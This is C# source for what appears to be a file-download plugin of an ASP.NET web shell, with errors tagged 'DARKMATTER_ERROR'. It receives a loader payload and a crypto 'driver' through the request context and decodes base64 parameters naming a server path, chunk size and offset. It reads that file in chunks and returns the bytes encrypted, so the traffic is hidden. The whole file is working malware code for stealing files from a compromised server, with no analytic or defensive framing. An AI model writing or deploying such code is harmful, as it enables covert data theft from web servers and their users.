using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;

public class file_download
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abOutput, 1});

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    private string fnWrite(string szPath, int nOffset, int nChunkSize)
    {
        FileInfo fileInfo = new FileInfo(szPath);
        long nFileSize = fileInfo.Length;

        if (nOffset >= nFileSize)
            return "2|";

        using (FileStream fs = new FileStream(szPath, FileMode.Open, FileAccess.Read, FileShare.Read))
        {
            fs.Seek(nOffset, SeekOrigin.Begin);

            long nRemaining = nFileSize - nOffset;
            int nReadSize = (int)Math.Min((long)nChunkSize, nRemaining);

            byte[] abBuffer = new byte[nReadSize];
            int nReadTotal = 0;

            while (nReadTotal < nReadSize)
            {
                int nRead = fs.Read(abBuffer, nReadTotal, nReadSize - nReadTotal);
                if (nRead <= 0)
                    break;

                nReadTotal += nRead;
            }

            if (nReadTotal == 0)
                return "0|ERROR://Read failed or empty data";

            byte[] abActualData = abBuffer;
            if (nReadTotal < nReadSize)
            {
                abActualData = new byte[nReadTotal];
                Buffer.BlockCopy(abBuffer, 0, abActualData, 0, nReadTotal);
            }

            string szb64Data = Convert.ToBase64String(abActualData);
            return "1|" + szb64Data;
        }
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            StringBuilder sb = new StringBuilder();

            string szPath = fnB64Decode(dic["z0"]);
            string szChunkSize = fnB64Decode(dic["z1"]);
            string szOffset = fnB64Decode(dic["z2"]);

            int nChunkSize = int.Parse(szChunkSize);
            int nOffset = int.Parse(szOffset);

            sb.Append(fnWrite(szPath, nOffset, nChunkSize));

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(sb.ToString()));
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}